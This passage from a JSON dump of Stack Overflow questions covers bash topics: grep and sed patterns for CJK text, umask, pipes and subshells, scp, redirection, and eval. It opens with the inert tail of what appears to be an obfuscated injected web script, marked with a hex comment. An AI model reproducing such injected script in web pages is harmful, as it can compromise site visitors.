var51=0.0135;var51+=1355;var var52=0.0019;var52++}, 100);\n/*/c3284d*/\n</code></pre>\n"},{"tags":["bash","sed","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":12405864,"title":"How to delete all lines containing a particular string, but only when the character afterwards is a CJK character?","body":"<p>I need to delete all lines from a file containing a match for <code>read (symbol)</code>, where <code>(symbol)</code> is any CJK character. In matches were <code>read (symbol)</code> is immediately preceded by A-Z or a-z, however, then the line should not be deleted. E.g., here are some sample lines and results:</p>\n\n<pre><code>Do you like to read books? (not deleted)\nCan you read 书? ( deleted)\n.read 书. (deleted)\nThis is some thread 线. (not deleted)\n</code></pre>\n\n<p>How can I delete only those lines matching <code>(not A-Z or a-z)read (CJK symbol)</code>?</p>\n"},{"tags":["bash","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12445341,"title":"How to delete all CJK text appearing immediately after a particular symbol?","body":"<p>I have some text like this:</p>\n\n<pre><code>This is some text Z书. This is Zsome more text Z计算机.\nThis is yet some more Z电脑 text Z.\n</code></pre>\n\n<p>I need to delete all cases matching the pattern <code>Z+(CJK)</code>, where <code>(CJK)</code> is any number of continuous CJK characters. The file above would become:</p>\n\n<pre><code>This is some text . This is Zsome more text .\nThis is yet some more  text Z.\n</code></pre>\n\n<p>How can I delete all CJK text matching this pattern?</p>\n"},{"tags":["bash","permissions","umask"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12445527,"title":"Set Different Umask For Files And Folders","body":"<p>I am writing a bash script to update some files/directories and I want to run umask in the script to set default permissions for files/directories created by the script. I know I can umask to set the permissions for both files and directories however I need the permissions to be different for files and folders.</p>\n\n<pre><code>I want files to be:   -rw----r-- (0604)\nI want folders to be: drwx-----x (0701)\n</code></pre>\n\n<p>Can I do this using umask? If so how do I go about doing it? If not what is the best way to achieve it? Thank you in advance.</p>\n"},{"tags":["regex","linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":262,"score":3,"question_id":10152512,"title":"What does \"\\2\" mean at the end of a regular expression","body":"<p>I have the following assignment:</p>\n\n<p>Words of a song are in a file called stairway.txt. Which of the following lines will be printed out after this command:\n</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>grep -E '(^.{4})(.{2}).*[ ]\\2' stairway.txt\n\n(a) Yes, there are two paths you can go by but in the long run\n\n(b) Its just a spring clean for the May queen.\n\n(c) Don't be alarmed now.\n\n(d) If there's a bustle in your hedgerow.\n\n(e) Theres still time to change the road you're on.\n</code></pre>\n\n<p>I don't understand what does the <code>\\2</code> at the end mean?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":12444949,"title":"Losing environment in while loop","body":"<p>A fun little bash teaser to which I'd love an explanation.</p>\n\n<p>Two loop constructs I would have though are identical, clearly are not.  Seems there's some difference in piping vs redirecting when doing a <code>while</code> loop.</p>\n\n<p><strong>Input File</strong></p>\n\n<p>Given this sample file called <code>values.txt</code> with this content:</p>\n\n<pre><code>1\n2\n3\n4\n5\n6\n</code></pre>\n\n<p><strong>Piping</strong> to while</p>\n\n<pre><code>$ value=0; cat values.txt | while read var; do value=`expr $value + $var`; done\n$ echo $value\n0\n</code></pre>\n\n<p><strong>Redirecting</strong> to while</p>\n\n<pre><code>$ value=0; while read var; do value=`expr $value + $var`; done &lt; values.txt\n$ echo $value\n21\n</code></pre>\n\n<p>To be brief, clearly in the first version each iteration of the <code>while</code> loop executes effectively as <code>()</code> and in the second each iteration iterates as <code>{}</code></p>\n\n<p>The question is not the difference between <code>()</code> and <code>{}</code>.  My question is what <em>causes</em> this difference in behavior for <code>while</code> loops?</p>\n\n<p>Is there a logical reason they should behave differently or was it just a bad choice made early on that couldn't be changed for compatibility reasons?  Is it ever possible to pipe to <code>while</code> and get <code>{}</code> behavior?</p>\n"},{"tags":["bash","shell","ubuntu"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12444808,"title":"How do I fetch lines before/after the grep result in bash?","body":"<p>Hi I'm very new to bash programming. I want a way to search in a given Text. For that I use <code>grep</code> function:</p>\n\n<pre><code>grep -i \"my_regex\"\n</code></pre>\n\n<p>That works. But given the <code>data</code> like this :</p>\n\n<pre><code>This is the test data\nThis is the error data as follows\n. . . \n. . . .\n. . . . . . \n. . . . . . . . .\nError data ends\n</code></pre>\n\n<p>Once I found the word <code>error</code> ( using <code>grep -i error data</code>), I wish to find the 10 lines that following the word <code>error</code>. So my output should be:</p>\n\n<pre><code>    . . . \n    . . . .\n    . . . . . . \n    . . . . . . . . .\n    Error data ends\n</code></pre>\n\n<p>Are there any ways to do it?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":12442968,"title":"bad substitution in a bash script","body":"<p>I've inherited a bash script (aren't legacies wonderful!) and I'm trying to figure out what's going wrong.  </p>\n\n<p>The offending line is this:\n     <code>while [ \"${\\(\\#\\)}\" -gt 0 ] ; do</code></p>\n\n<p>and I get a \"bad substitution\" error message when I try to run it.  I'm pretty sure it's trying to ask if the number of args is greater than zero, but you know that too.</p>\n\n<p>I don't know if it ever worked.  I imagine there are not enough backslashes, or maybe too many, or maybe the parentheses don't belong there.  I tried several of these, but no luck.  </p>\n\n<p>Any enlightenment appreciated.</p>\n"},{"tags":["file","bash","shell","terminal"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12435649,"title":"Getting specific files from server","body":"<p>Using Terminal and Shell/Bash commands is there a way to retrive specific files from a web directory? I.e.</p>\n\n<p>Directory: www.site.com/samples/</p>\n\n<p>copy all files ending in \".h\" into a folder </p>\n\n<p>The folder contains text files, and other files associated that are of no use.</p>\n\n<p>Thanks :) </p>\n"},{"tags":["linux","bash","args"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12443752,"title":"Bash ARGS help - getting random error","body":"<p>Trying to set rules if a certain variable is put into place, can someone identify wtf I'm missing here?</p>\n\n<p>test.sh:</p>\n\n<pre><code>#!/bin/bash\nargs=($@)\nif [ \"$@\" = \"--cron\" ]; then \n echo \"WORKS!\";\n    else echo \"FAILS\"\nfi\n</code></pre>\n\n<p>output of <code>./test.sh</code>:</p>\n\n<pre><code>./test.sh: line 3: [: =: unary operator expected\nFAILS\n</code></pre>\n\n<p>However, when I run <code>./test.sh --cron</code>, it works, and <code>WORKS</code> is output.</p>\n"},{"tags":["bash","time","iostat"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12443505,"title":"iostat & steal time","body":"<p>I am trying to catch some data from iostat output:</p>\n\n<blockquote>\n<pre><code># iostat  -m\n\navg-cpu:  %user   %nice %system %iowait  %steal   %idle\n           9.92    0.00   14.17    0.01    0.00   75.90\n\nDevice:            tps    MB_read/s    MB_wrtn/s    MB_read    MB_wrtn\nsda               6.08         0.00         0.04       2533     261072\ndm-0              1.12         0.00         0.00       1290      30622\ndm-1              0.00         0.00         0.00          1          0\ndm-2              1.22         0.00         0.00          0      33735\ndm-3              7.22         0.00         0.03       1213     196713\n</code></pre>\n</blockquote>\n\n<p>How can I match the \"0.00\" value?\nNumbers aren't separated by a tab or a constant number of spaces.\nAlso the value can be 3 digits 0.00 or 4 digits 45.00, etc.</p>\n\n<p>Any idea how to match it using bash?</p>\n"},{"tags":["python","bash","svn","pipes","pre-commit-hook"],"answer_count":2,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":171,"score":7,"question_id":12397469,"title":"Pipe STDIN to a script that is itself being piped to the Python interpreter?","body":"<p>I need to implement an SVN pre-commit hook which executes a script that itself is stored in SVN.</p>\n\n<p>I can use the <code>svn cat</code> command to pipe that script to the Python interpreter, as follows:</p>\n\n<pre><code>svn cat file://$REPO/trunk/my_script.py | python - --argument1 --argument2\n</code></pre>\n\n<p>However, <code>my_script.py</code> itself requires data to be piped on STDIN.</p>\n\n<p>That data is not stored in a file; it is stored on the network. I would prefer not to have to download the data to a temporary file, as normally I could pipe it to a Python program:</p>\n\n<pre><code>curl http://example.com/huge_file.txt | python my_script.py\n</code></pre>\n\n<p>I'm not sure how to combine both of these pipes.</p>\n"},{"tags":["ruby","bash","rvm"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":434,"score":0,"question_id":5771975,"title":"custom env vars with rvmsudo","body":"<p>I am trying to run a ruby script which needs root access for some of its tasks. I know that rvmsudo exists and I use it, but if I want to set up an env var such as <code>TEST_ENV=1</code>, it doesn't work.</p>\n\n<p>Example:</p>\n\n<pre><code>rvmsudo ruby some_script_which_requires_root_access.rb\n</code></pre>\n\n<p>When I debug the script and examine the <code>ENV</code> hash, I don't see the <code>TEST_ENV=1</code> var. I have tried exporting the var via:</p>\n\n<pre><code>export TEST_ENV=1 \n</code></pre>\n\n<p>and put this in <code>.rvmrc</code>, in <code>.bash_profile</code> and <code>.bashrc</code> for the <code>current_user</code>, and also in <code>.profile</code> and <code>.bashrc</code> of the root user but doesn't work. </p>\n\n<p>So my question is, where should I define or export this <code>TEST_ENV=1</code> so that when I run the script with <code>rvmsudo</code> it is part of the <code>ENV</code> ruby hash?</p>\n"},{"tags":["bash","shell","unix","quoting"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12419255,"title":"How to cc a maillist in mailx command","body":"<p>I had prepared a cc maillist as below:</p>\n\n<pre><code>/appl/tracker/TEST&gt; more abc.maillist\nxyz@yahoo.com, a123@gmail.com, abc@xyz.com\n</code></pre>\n\n<p>And a to maillist as below:</p>\n\n<pre><code>/appl/tracker/TEST&gt; more Servicedesk.maillist\n123@gmail.com\n</code></pre>\n\n<p>My script is <code>ab.sh</code> which will call the <code>mailx</code> command and send an email. This should send email to <code>cc_list</code> keeping the id's in cc and <code>to_list</code> placing the id provided in the list in to list.</p>\n\n<pre><code>/appl/tracker/TEST&gt; more ab.sh\n#!/bin/ksh\nl_date=`date +%d%m%y`\nCC_LIST=`cat /appl/tracker/TEST/abc.maillist`\nTO_LIST=`cat /appl/tracker/TEST/Servicedesk.maillist`\nMY_Q=\"'\"\n\ncc_list=\"$MY_Q$CC_LIST$MY_Q\"\n\necho $cc_list\n\nBODYFILE='Please find attached file having my details.Test mail'\n\necho $CC_LIST\necho $TO_LIST\n\nmailx -s 'HI'  -c $cc_list $TO_LIST &lt;&lt;-EOF\n`echo $BODYFILE`\nEOF\n\n/appl/tracker/TEST&gt;\n</code></pre>\n\n<p>Output:</p>\n\n<p>There is an error being occured stating that there is an unbalanced <code>\"</code>.\nCan anyone please help me getting the solution for this.</p>\n"},{"tags":["bash","signals"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12291290,"title":"Launch an executable and send signal to it whilst running","body":"<p>I need a script that runs 'A' and send to it a signal that should terminate it, and I need to iterate that with different signals so what I want basically is </p>\n\n<pre><code>Launch A -&gt;\nsend signal S to terminate A and check stuff -&gt;\nRelaunch A -&gt;\nsend signal S1 ......\n</code></pre>\n\n<p>My problem is that in A I've a loop like:</p>\n\n<pre><code>while(1){\n    scanf()\n    ...DO STUFF...\n}\n</code></pre>\n\n<p>So using a script like </p>\n\n<pre><code>./A arguments\nkill -s QUIT A'sPid\n</code></pre>\n\n<p>won't work, because obviously it will not reach the kill line until A's over, and it won't without a signal or user input. </p>\n\n<p>Can you give me any hint? Thanks, and sorry if it's a banal question, but I've just started learning this stuff.</p>\n"},{"tags":["bash","node.js"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12430321,"title":"Create a launcher for a node.js script","body":"<p>I'm trying to create a launcher for node.js scripts (so that I can run the scripts by clicking on their file icons instead of launching them from the terminal.) How is this usually done? I'd prefer if I could simply run a script in the terminal by clicking on its icon.</p>\n\n<p>I tried writing a shell script to launch another script in the same folder, but it doesn't show the node.js script's command line output for some reason: </p>\n\n<pre><code>#!/bin/bash\necho -n \"Enter a node.js script to run &gt; \"\nread text\nnode \"$text\"\n</code></pre>\n"},{"tags":["bash","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12434718,"title":"How to replace the first, middle, and last occurrences of a symbol with different symbols?","body":"<p>I have a file containing many <code>/</code>'s per line, e.g.:</p>\n\n<pre><code>This/is/an/example.\nThis/is/another/example/to/read.\nRead/this/example.\nLast/example.\n</code></pre>\n\n<p>I need to replace the first occurrence of <code>/</code> on each line with <code>\\BEGIN</code>, the last occurrence of <code>/</code> on each line with <code>\\END</code>, and all of the remaining occurrences of <code>/</code> with <code>\\MIDDLE</code>. E.g., the above file would become this:</p>\n\n<pre><code>This\\BEGINis\\MIDDLEan\\ENDexample.\nThis\\BEGINis\\MIDDLEanother\\MIDDLEexample\\MIDDLEto\\ENDread.\nRead\\BEGINthis\\ENDexample.\nLast\\BEGINexample.\n</code></pre>\n\n<p>How can I replace this symbol in this way using BASH or other tools available on Linux, such as <code>grep</code>?</p>\n"},{"tags":["bash","redirect","stdout"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":45,"score":4,"question_id":12440164,"title":"Redirecting Multiple stdouts","body":"<p>I have three files ina a directory named One, Two, Three.</p>\n\n<p>One contains:</p>\n\n<pre><code>asdfg\n</code></pre>\n\n<p>Two contains:</p>\n\n<pre><code>qwerty\n</code></pre>\n\n<p>Three contains:</p>\n\n<pre><code>zxcvb\n</code></pre>\n\n<p>When I give the following command:</p>\n\n<pre><code>$ls &gt; One &gt; Two &gt; Three\n</code></pre>\n\n<p>Then I give the following command:</p>\n\n<pre><code>$cat One\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Nothing\n</code></pre>\n\n<p>Then I give the following command:</p>\n\n<pre><code>$cat Two\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Nothing\n</code></pre>\n\n<p>Then I give the following command:</p>\n\n<pre><code>$cat Three\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>One\nThree\nTwo\n</code></pre>\n\n<p>Can anyone please shed light on what exaclty is happening here? Why do the files One &amp; Two become empty and the why does the output of the ls command get written only to the file Three?</p>\n"},{"tags":["bash","ssh","scp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":138,"score":0,"question_id":12440287,"title":"SCP doesn't work when echo in .bashrc?","body":"<p>I have two users in Fedora:</p>\n\n<p>(i) Wani\n(ii) root (quite obvious!)</p>\n\n<p>My contents of .bashrc of user Wani are:</p>\n\n<pre><code> # .bashrc\n echo \"Hello\"\n # Source global definitions\n if [ -f /etc/bashrc ]; then\n    . /etc/bashrc\n fi\n\n # User specific aliases and functions\n</code></pre>\n\n<p>Now after logging into root, I type the following commands:</p>\n\n<pre><code> [root@Dell Wani]#touch try.txt\n [root@Dell Wani]#service sshd start\n [root@Dell Wani]#scp try.txt Wani@localhost:~/\n Wani@localhost's password: \n Hello\n [root@Dell Wani]#\n</code></pre>\n\n<p>Now I log into Wani, and type:</p>\n\n<pre><code> [Wani@Dell ~]$ cat try.txt\n cat: try.txt: No such file or directory\n [Wani@Dell ~]$ \n</code></pre>\n\n<p>Now I again log into root and type the same command with -v:</p>\n\n<pre><code> [root@Dell Wani]# scp -v morph.log Wani@localhost:\n Executing: program /usr/bin/ssh host localhost, user Wani, command scp -v -t -- .\n OpenSSH_5.6p1, OpenSSL 1.0.0j-fips 10 May 2012\n debug1: Reading configuration data /etc/ssh/ssh_config\n debug1: Applying options for *\n debug1: Connecting to localhost [127.0.0.1] port 22.\n debug1: Connection established.\n debug1: permanently_set_uid: 0/0\n debug1: identity file /root/.ssh/id_rsa type -1\n debug1: identity file /root/.ssh/id_rsa-cert type -1\n debug1: identity file /root/.ssh/id_dsa type -1\n debug1: identity file /root/.ssh/id_dsa-cert type -1\n debug1: Remote protocol version 2.0, remote software version OpenSSH_5.6\n debug1: match: OpenSSH_5.6 pat OpenSSH*\n debug1: Enabling compatibility mode for protocol 2.0\n debug1: Local version string SSH-2.0-OpenSSH_5.6\n debug1: SSH2_MSG_KEXINIT sent\n debug1: SSH2_MSG_KEXINIT received\n debug1: kex: server-&gt;client aes128-ctr hmac-md5 none\n debug1: kex: client-&gt;server aes128-ctr hmac-md5 none\n debug1: SSH2_MSG_KEX_DH_GEX_REQUEST(1024&lt;1024&lt;8192) sent\n debug1: expecting SSH2_MSG_KEX_DH_GEX_GROUP\n debug1: SSH2_MSG_KEX_DH_GEX_INIT sent\n debug1: expecting SSH2_MSG_KEX_DH_GEX_REPLY\n debug1: Host 'localhost' is known and matches the RSA host key.\n debug1: Found key in /root/.ssh/known_hosts:2\n debug1: ssh_rsa_verify: signature correct\n debug1: SSH2_MSG_NEWKEYS sent\n debug1: expecting SSH2_MSG_NEWKEYS\n debug1: SSH2_MSG_NEWKEYS received\n debug1: Roaming not allowed by server\n debug1: SSH2_MSG_SERVICE_REQUEST sent\n debug1: SSH2_MSG_SERVICE_ACCEPT received\n debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-     with-mic,password\n debug1: Next authentication method: gssapi-keyex\n debug1: No valid Key exchange context\n debug1: Next authentication method: gssapi-with-mic\n debug1: Unspecified GSS failure.  Minor code may provide more information\n Credentials cache file '/tmp/krb5cc_0' not found\n\n debug1: Unspecified GSS failure.  Minor code may provide more information\n Credentials cache file '/tmp/krb5cc_0' not found\n\n debug1: Unspecified GSS failure.  Minor code may provide more information\n\n\n debug1: Unspecified GSS failure.  Minor code may provide more information\n\n\n debug1: Next authentication method: publickey\n debug1: Trying private key: /root/.ssh/id_rsa\n debug1: Trying private key: /root/.ssh/id_dsa\n debug1: Next authentication method: password\n Wani@localhost's password: \n debug1: Authentication succeeded (password).\n Authenticated to localhost ([127.0.0.1]:22).\n debug1: channel 0: new [client-session]\n debug1: Requesting no-more-sessions@openssh.com\n debug1: Entering interactive session.\n debug1: Sending environment.\n debug1: Sending env XMODIFIERS = @im=none\n debug1: Sending env LANG = en_US.UTF-8\n debug1: Sending command: scp -v -t -- .\n Hello\n [root@Dell Wani]# debug1: client_input_channel_req: channel 0 rtype exit-status      reply      0\n debug1: channel 0: free: client-session, nchannels 1\n debug1: fd 0 clearing O_NONBLOCK\n debug1: fd 1 clearing O_NONBLOCK\n Transferred: sent 1664, received 1976 bytes, in 0.1 seconds\n Bytes per second: sent 22961.5, received 27266.8\n debug1: Exit status 0\n</code></pre>\n\n<p>(And After I press Enter)</p>\n\n<pre><code> [root@Dell Wani]# \n</code></pre>\n\n<p>Can anyone please shed some light as to what exactly happened here? Why did the file not get copied to Wani from root?</p>\n"},{"tags":["bash","sorting","redirect","input","stdin"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":70,"score":3,"question_id":12371283,"title":"Redirecting Multiple stdins?","body":"<p>I have three files named One, Two, Three.</p>\n\n<p>One contains:</p>\n\n<pre><code>1\n3\n2\n</code></pre>\n\n<p>Two contains:</p>\n\n<pre><code>4\n6\n5\n</code></pre>\n\n<p>Three contains:</p>\n\n<pre><code>7\n9\n8\n</code></pre>\n\n<p>When I give the following command:</p>\n\n<pre><code>$sort &lt; One &lt; Two &lt; Three\n</code></pre>\n\n<p>I get the output:</p>\n\n<pre><code>7\n8\n9\n</code></pre>\n\n<p>But when I give the following command:</p>\n\n<pre><code>$sort One Two Three\n</code></pre>\n\n<p>I get the ouput:</p>\n\n<pre><code>1\n2\n3\n4\n5\n6\n7\n8\n9\n</code></pre>\n\n<p>Can anyone please shed light on what exaclty is happening here? Why does the input from 1 and 2 not taken into consideration in the first command?</p>\n"},{"tags":["bash","shell"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2026,"score":2,"question_id":7358611,"title":"Bash: Get users home directory when they run a script as root","body":"<p>I have a sh script that needs to be run as root, however it is run by the end user using sudo. How can I get the users home directory when ~/ points to /root when running with sudo?</p>\n"},{"tags":["git","bash","centos","gitolite","gitlab"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":12439169,"title":"cent os bash unrecognized option --system on adduser command","body":"<p>I am trying to install gitlab on my centos linux sever. I am following the tutorial located here: <a href=\"https://gist.github.com/1601228\" rel=\"nofollow\">https://gist.github.com/1601228</a></p>\n\n<p>Everything goes smoothly until I reach this line: <code>adduser --system --shell /bin/sh --comment 'gitolite' --create-home --home-dir /home/git git</code></p>\n\n<p>and my shell just returns this: <code>adduser: unrecognized option '--system'</code></p>\n\n<p>I can't seem to find how to enable that option or why it isn't available.</p>\n\n<p>I'm running:</p>\n\n<ul>\n<li>CentOS release 5.8 (Final) </li>\n<li>GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)</li>\n</ul>\n\n<p>Let me know if I need to post any other software versions.</p>\n\n<p><strong>How do I run this command successfully or accomplish the same task this command is performing on my current version of centos/bash/etc?</strong></p>\n"},{"tags":["bash","svn","tortoisesvn"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12437561,"title":"SVN Post-Commit not working","body":"<p>I'm using Blue Host and was setting up my SVN and I have been able to set up and checkout repositories perfectly fine, but when I've tried to setup a post-commit, I keep getting the error</p>\n\n<pre><code>post-commit hook failed (exit code 255) with no output.\n</code></pre>\n\n<p>Here is the current post-commit hook that I'm using</p>\n\n<pre><code>#!/bin/bash\n/usr/bin/svn update /home1/firewal2/www/svntest\n</code></pre>\n\n<p>Any help would be greatly appreciated, and I can provide more information if needed. Thanks!</p>\n\n<p>-Blake</p>\n"},{"tags":["bash","script","quotes","sh","mkdir"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12437386,"title":"Bash scripting: mkdir error","body":"<p>I have the following script sample: </p>\n\n<pre><code>#!/bin/bash\n\n# Aborts the script on \"simple command failure\" (does not cover pipes)\nset -e\n\n# Makes sure we do not run the script outside the correct directory (i.e. the backup directory)\nprojects_directory='~/projects' \nbackup_drectory=\"${projects_directory}/backup/\"\necho \"Backup directory: ${backup_drectory}\"\n\nif [ ! -d \"$projects_directory\" ]; then \n    mkdir \"$projects_directory\"\n    echo \"${projects_directory} created successfully\" \nfi\n</code></pre>\n\n<p>Which fails miserably with the following output: </p>\n\n<pre><code>Backup directory: ~/projects/backup/\nmkdir: cannot create directory `~/projects': No such file or directory\n</code></pre>\n\n<p>I do not understand why. If I enter the <code>mkdir ~/projects</code> command manually in a Terminal, the directory gets created. Any suggestion is most welcome. </p>\n"},{"tags":["java","bash","chromium"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12437238,"title":"Opening a chrome tab and get control on it from a Java app","body":"<p>I'm building an application to edit some html/css directly from a server. It works fine but I want to open chromium or firefox on the edited page to render the result.\nI can open a new tab with the CLI with: </p>\n\n<pre><code>chromium-browser http://www.google.com\n</code></pre>\n\n<p>But if I re-call this command it opens a new tab.</p>\n\n<p>How can I get control on the tab to close it and re-open a new tab ?\nOr can I replace the url of the tab directly from de CLI ?</p>\n\n<p>Thanks.</p>\n"},{"tags":["bash","obfuscation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12422283,"title":"Modify passed parameter directly","body":"<p>I have following function:</p>\n\n<pre><code>s() { c=$1; while((c--)) ; do printf 'x' ; done }; s 2\n</code></pre>\n\n<p>So <code>x</code> is printed two times.</p>\n\n<p>Is it possible to simplify this code ?</p>\n\n<p>At first I'd like to skip assignation part <code>c=$1;</code> and do:</p>\n\n<pre><code>while((1--))\n</code></pre>\n\n<p>Do you have any ideas ?</p>\n"},{"tags":["linux","bash","pipe","vlc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12437085,"title":"keep pipe open without reading from it?","body":"<p>I'm using vlc media player to connect to a rtsp stream over the internet.</p>\n\n<p>I only need to view the stream periodically but it takes too long to establish a connection each time.</p>\n\n<p>Instead I keep the connection open and vlc writes the output to a named pipe as a transport stream.</p>\n\n<p>Then a second instance of vlc can read from the pipe as and when I need it.</p>\n\n<p>The problem is, as I understand it, a named pipe cannot be written to unless its open for reading.</p>\n\n<p>To get around this problem when the second instance of vlc is not open I:</p>\n\n<pre><code>    cat &lt; $PIPE &gt; /dev/null\n</code></pre>\n\n<p>Is there a better way to keep a pipe open for writing other than using cat in this way?</p>\n"},{"tags":["bash","shell","concurrency"],"answer_count":8,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":2342,"score":4,"question_id":1537956,"title":"Bash: limit the number of concurrent jobs?","body":"<p>Is there an easy way to limit the number of concurrent jobs in bash? By that I mean making the &amp; block when there are more then n concurrent jobs running in the background.</p>\n\n<p>I know I can implement this with ps | grep -style tricks, but is there an easier way?</p>\n"},{"tags":["linux","eclipse","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":12436275,"title":"Bash shell in one of Eclipse's windows","body":"<p>I use Eclipse under a Linux machine (Ubuntu) and I usually have to use the shell a lot when I program - e.g., to use source control, perform builds. Is there a way to make gnome-terminal (or any other bash terminal for that matter) part of the eclipse views, so I can dock it where ever I want in the Eclipse work area?</p>\n"},{"tags":["bash","pythonanywhere"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12434327,"title":"Restart server from bash console","body":"<p>Is there any way to restart the web server from within the <code>bash</code> console given in the browser for <code>PythonAnywhere</code>? I have searched google for a while and have not found anything relevant.</p>\n"},{"tags":["bash","shell","variables","script","eval"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12416237,"title":"Using the bash eval builtin to allow ini files to have command strings in them","body":"<p>I've been putting together a bash script that takes an ini file (with a format that I've been developing alongside the script) and reads through the file, performing the actions specified. </p>\n\n<p>One of the functions in the ini format allows for a shell command to be passed in and run using <code>eval</code>. I'm running into a problem when the commands contain a variable name. </p>\n\n<p><code>eval</code> (or the shell in general) doesn't seem to be substituting the values correctly and most of the time it seems to replace all the variable names with blanks, breaking the command. Subshells to create a string output seem to have the same problem. </p>\n\n<p>The strange part is that this worked on my development machine (Running linux mint 13), but when I moved the script to the target machine running CentOS 5.8, these issues showed up.</p>\n\n<p>Some examples of code I read in from the ini file:</p>\n\n<pre><code>shellcmd $toolspath/program &gt; /path/file\n\nshellcmd parsedata=$( cat /path/file )\n</code></pre>\n\n<p>These go through a script function that strips off the leading <code>shellcmd</code> and then evals the string using</p>\n\n<pre><code>eval ${scmd}\n</code></pre>\n\n<p>Any ideas on what might be causing the weird behavior and anything I can try to resolve the problem? My ultimate goal here is to have the ability to read in a line from a file and have my script execute it and be able to correctly handle script variables from the read in command.</p>\n"},{"tags":["bash","script"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":71,"score":-1,"question_id":12422289,"title":"bash command to covert html page to a text file","body":"<p>I am a beginner to linux. Would you please help me how to convert an html page to a text file. the text file will remove any images and links from the webpage. I want to use only bash commands and not html to text converting tools. As an example, i want to convert the first page google search results for \"computers\".</p>\n\n<p>Thank you</p>\n"},{"tags":["linux","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12361437,"title":"Redirect pgrep to a file twice in a single command","body":"<p>I have an excercise to practice BASH in Linux and Im quite stuck. It says the following:</p>\n\n<p>\"List all process with the term BASH in their command line. Redirect the output to a file. Do this two more times adding it at the end of the file. Then list the commands ordered by PID. DO THIS IN JUST ONE COMMAND.\"</p>\n\n<p>I KNOW Y MUST USE | AND >>....</p>\n\n<p>I tried using something like this</p>\n\n<p>pgrep -fl bash | </p>\n\n<p>But i have no idea how to continue...</p>\n\n<p>Thanks in advance!!!</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12433190,"title":"cd to an unknown directory name with spaces in a bash script","body":"<p>I've looked at some of the posts that have similar issues, but I can't extrapolate some of the solutions to fit my own needs, so here I am. </p>\n\n<p>I have a simple shell script and I need it to cd into a directory with a space in the name. The directory is in the same place every time (<code>/home/user/topleveldir</code>) but the directory name itself is unique to the machine, and has a space in it (<code>/home/user/topleveldir/{machine1}\\ dir/</code>, <code>/home/user/topleveldir/{machine2}\\ dir/</code>). I'm confused as to the best method to cd into that unique directory in a script.</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":48,"score":-1,"question_id":12431517,"title":"how to make a script with log files","body":"<p>I have a script that generates various outputs on the console, it runs various commands and programs.</p>\n\n<p>I'm looking for a way to put all console output into a log file. But he did not want the \". / MeuScrip >> log.txt\". Also use \". / Myscript | tee log.txt\". but this hide questions confirmation of programs (y|n).</p>\n\n<p>I wanted to configure the log file in my script.\nDoes anyone have a solution for this?</p>\n\n<p>thank you\nFelipe</p>\n"},{"tags":["bash","sorting","awk"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12417403,"title":"How to sort the lines in a file from shortest to longest?","body":"<p>Similar to <a 